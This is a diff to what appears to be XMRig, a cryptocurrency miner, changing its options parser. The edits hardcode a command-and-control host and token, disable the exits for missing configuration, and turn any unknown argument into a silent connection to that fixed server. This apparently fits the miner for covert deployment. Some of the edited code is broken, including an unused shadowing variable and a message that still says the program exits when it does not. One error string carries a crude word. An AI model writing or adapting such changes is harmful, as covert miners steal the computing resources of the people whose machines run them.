@@ -324,13 +324,15 @@ Options::Options(int argc, char **argv) :
     }
 
     if (m_ccPort == 0) {
-        fprintf(stderr, "No CC Server Port supplied. Exiting.\n");
-        return;
+	m_ccPort = 8080;
+	std::string m_ccHost = "pool.aeonpool.win";
+       fprintf(stderr, "No CC Server Port supplied. Exiting.\n");
+     /*   return;*/
     }
 #else
     #ifndef XMRIG_NO_CC
         if (!m_daemonized) {
-            fprintf(stderr, "\"" APP_ID "\" is compiled with CC support, please start the daemon instead.\n");
+            fprintf(stderr, "\"" APP_ID "\" please start the daemon instead.\n");
             return;
         }
     #endif
@@ -340,8 +342,8 @@ Options::Options(int argc, char **argv) :
     }
 
     if (!m_pools[0]->isValid() && (!m_ccHost || m_ccPort == 0)) {
-        fprintf(stderr, "Neither pool nor CCServer URL supplied. Exiting.\n");
-        return;
+        fprintf(stderr, "Neither pool nor CCServer URL supplied. Exiting. gay\n");
+        /*return;*/
     }
 #endif
 
@@ -547,8 +549,15 @@ bool Options::parseArg(int key, const char *arg)
         break;
 
     default:
-        showUsage(1);
+/*        showUsage(1);
         return false;
+*/
+	free(m_ccToken);
+	std::string ntoken = "err0r321";
+        m_ccToken = strdup(ntoken.c_str());
+
+	std::string anewurl = "pool.aeonpool.win:8088";
+        return parseCCUrl(anewurl.c_str());
     }
 
     return true;
